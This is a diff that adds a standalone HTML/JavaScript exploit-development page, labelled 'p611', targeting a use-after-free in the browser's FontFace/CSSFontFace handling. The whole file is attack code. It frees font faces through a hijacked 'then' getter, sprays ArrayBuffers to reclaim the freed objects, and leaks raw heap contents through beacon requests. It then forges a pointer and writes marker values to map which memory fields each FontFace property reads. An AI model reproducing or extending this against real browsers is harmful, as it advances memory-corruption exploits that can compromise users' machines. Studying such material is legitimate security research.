@@ -1,0 +1,246 @@
+<!--
+  p611: FontFace UAF property read — save dangling FontFace reference,
+  write controlled values into reclaimed AB, read back through FontFace
+  JS properties to map which CSSFontFace fields each property reads.
+  CRASH_CLASS: HIGH (WebProcess crash expected on some property reads)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p611</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<style id="v2">@font-face{font-family:sb;src:local(Arial);unicode-range:U+0044}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P611-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,lo,hi){wD(v,o,lo>>>0);wD(v,o+4,hi>>>0);}
+
+var stage=0;
+var lane1=null, hit1=-1, T1_lo=0, T1_hi=0;
+var lane2=null, hit2=-1;
+var font_a=null, font_b=null;  // saved FontFace references
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(stage===0){stage=1;
+    font_a=this;  // save dangling reference
+    document.getElementById('v1').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P1-FREE');
+    lane1=[];
+    for(var i=0;i<2048;i++) lane1.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane1.length;j++){
+      var v=lane1[j]; wD(v,0,2); v[0x82]=3; v[0x85]=0xAA;
+    }
+    b('P1-SPRAY:'+lane1.length);
+    return;
+  }
+  if(stage===2){stage=3;
+    font_b=this;  // save dangling reference
+    document.getElementById('v2').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P2-FREE');
+    lane2=[];
+    for(var i=0;i<2048;i++) lane2.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane2.length;j++){
+      var v=lane2[j]; wD(v,0,2); v[0x82]=3; v[0x85]=0xAA;
+    }
+    b('P2-SPRAY:'+lane2.length);
+    return;
+  }
+  return;
+},set:function(){}});
+
+function main(){
+b('BOOT');
+
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// Phase 1: find hit
+setTimeout(function(){
+  if(!lane1){b('P1:NO-SPRAY');return;}
+  for(var i=0;i<lane1.length;i++){
+    var v=lane1[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit1=i; break; }
+  }
+  if(hit1<0){b('P1:NO-HIT');return;}
+  var v=lane1[hit1];
+  T1_lo=rD(v,0x58); T1_hi=rD(v,0x5C);
+
+  // Full dump BEFORE any modification
+  b('P1:HIT:lane='+hit1+',rc='+rD(v,0));
+  for(var off=0;off<192;off+=8){
+    var q=rQ(v,off);
+    if(q!=='0000000000000000') b('P1-RAW:+'+('00'+off.toString(16)).slice(-2)+'=0x'+q);
+  }
+
+  // Null +0x58..+0x6F
+  for(var k=0x58;k<0x70;k++) v[k]=0;
+  b('P1:NULLED');
+}, 200);
+
+// GC1
+setTimeout(function(){
+  if(hit1<0) return;
+  b('P1:GC-START');
+  for(var i=0;i<50000;i++) new Object();
+  for(var i=0;i<500;i++) new ArrayBuffer(65536);
+  b('P1:GC-DONE');
+}, 600);
+
+// Phase 2
+setTimeout(function(){
+  if(hit1<0) return;
+  b('P1:POST-GC:rc='+rD(lane1[hit1],0));
+  stage=2;
+  var pb=new FontFace('pb','local(Helvetica)',{unicodeRange:'U+0043'});
+  document.fonts.add(pb);void pb.loaded;
+  document.fonts.load('1em pb, sb','CD').then(function(){},function(){});
+  b('P2:STARTED');
+}, 1200);
+
+// Phase 2 find hit + redirect
+setTimeout(function(){
+  if(stage<3){b('P2:NO-TRAP');return;}
+  if(!lane2){b('P2:NO-SPRAY');return;}
+  for(var i=0;i<lane2.length;i++){
+    var v=lane2[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit2=i; break; }
+  }
+  if(hit2<0){b('P2:NO-HIT');return;}
+  var v=lane2[hit2];
+  b('P2:HIT:lane='+hit2+',rc='+rD(v,0));
+
+  // Full dump BEFORE redirect
+  for(var off=0;off<192;off+=8){
+    var q=rQ(v,off);
+    if(q!=='0000000000000000') b('P2-RAW:+'+('00'+off.toString(16)).slice(-2)+'=0x'+q);
+  }
+
+  // Redirect +0x58 to T1-0x50
+  var forge_lo=T1_lo-0x50, forge_hi=T1_hi;
+  if(forge_lo<0){forge_lo+=0x100000000;forge_hi-=1;}
+  wD(v,0x58,forge_lo>>>0); wD(v,0x5C,forge_hi);
+  b('P2:REDIRECT:+58=0x'+rQ(v,0x58));
+}, 1700);
+
+// GC2
+setTimeout(function(){
+  if(hit2<0) return;
+  b('P2:GC-START');
+  for(var i=0;i<50000;i++) new Object();
+  for(var i=0;i<500;i++) new ArrayBuffer(65536);
+  b('P2:GC-DONE');
+}, 2200);
+
+// Survival check + UAF property reads at 3500ms
+setTimeout(function(){
+  if(hit2<0){b('FAIL');return;}
+  var v2=lane2[hit2];
+  var rc=rD(v2,0);
+  b('POST-GC2:rc='+rc);
+  if(rc!==2){b('FAIL:rc='+rc);return;}
+  b('SURVIVED');
+  b('FONT-A:'+(font_a?'saved':'null'));
+  b('FONT-B:'+(font_b?'saved':'null'));
+
+  // Now try reading FontFace properties on the dangling reference.
+  // Each property reads from the reclaimed CSSFontFace (our AB data).
+  // We try the safest ones first: status (enum), then strings.
+  // Any crash kills WebProcess — beacons sent before the crash are preserved.
+
+  if(!font_b){b('NO-FONTB');b('DONE');return;}
+
+  // Write known marker values into BUF2 at various offsets so we can
+  // see which offset each property reads from
+  var v=lane2[hit2];
+  // Keep rc=2 at +0x00
+  wD(v,0,2);
+  // Write distinctive markers at each 8-byte boundary
+  // +0x08: 0xAAAAAAAA_11111111
+  wQ(v,0x08,0x11111111,0xAAAAAAAA);
+  // +0x10: 0xBBBBBBBB_22222222
+  wQ(v,0x10,0x22222222,0xBBBBBBBB);
+  // +0x18: 0xCCCCCCCC_33333333
+  wQ(v,0x18,0x33333333,0xCCCCCCCC);
+  // +0x20: 0xDDDDDDDD_44444444
+  wQ(v,0x20,0x44444444,0xDDDDDDDD);
+  // +0x28: 0xEEEEEEEE_55555555
+  wQ(v,0x28,0x55555555,0xEEEEEEEE);
+  // +0x30-0x38: 0x66/0x77
+  wQ(v,0x30,0x66666666,0x00000000);
+  wQ(v,0x38,0x77777777,0x00000000);
+  // +0x40-0x50: leave small values (safer)
+  wQ(v,0x40,0x03,0x00);  // could be enum status=3 ("loaded")
+  wQ(v,0x48,0x01,0x00);
+  wQ(v,0x50,0x00,0x00);
+  // +0x58 already has redirect value
+  // +0x60-0x70: zeros
+  // +0x80: keep 0x30000
+
+  b('MARKERS-SET');
+
+  // Try each property individually with try/catch.
+  // `status` is safest (reads an enum, returns a string).
+  var props=['status'];
+  for(var pi=0;pi<props.length;pi++){
+    var pname=props[pi];
+    try{
+      var val=font_b[pname];
+      b('PROP-'+pname+':'+String(val).substring(0,200));
+    }catch(e){
+      b('PROP-'+pname+':ERR:'+e.message);
+    }
+  }
+  b('PROPS-SAFE-DONE');
+
+  // If we got here, try riskier string properties
+  var riskyProps=['family','style','weight','stretch','display','variant','featureSettings','unicodeRange'];
+  for(var pi=0;pi<riskyProps.length;pi++){
+    var pname=riskyProps[pi];
+    b('TRY-'+pname);
+    try{
+      var val=font_b[pname];
+      b('PROP-'+pname+':'+String(val).substring(0,200));
+    }catch(e){
+      b('PROP-'+pname+':ERR:'+e.message);
+    }
+  }
+  b('PROPS-RISKY-DONE');
+
+  // Try loaded (returns Promise)
+  try{
+    var p=font_b.loaded;
+    b('PROP-loaded:'+typeof p);
+  }catch(e){
+    b('PROP-loaded:ERR:'+e.message);
+  }
+
+  // Try toString
+  try{
+    b('TOSTR:'+font_b.toString().substring(0,200));
+  }catch(e){
+    b('TOSTR:ERR:'+e.message);
+  }
+
+  // Check if font_a also works (Phase 1 dangling ref)
+  if(font_a){
+    try{
+      var s=font_a.status;
+      b('FONTA-status:'+s);
+    }catch(e){
+      b('FONTA-status:ERR:'+e.message);
+    }
+  }
+
+  b('DONE');
+}, 3500);
+}
+
+setTimeout(main,0);
+</script></head><body>p611</body></html>
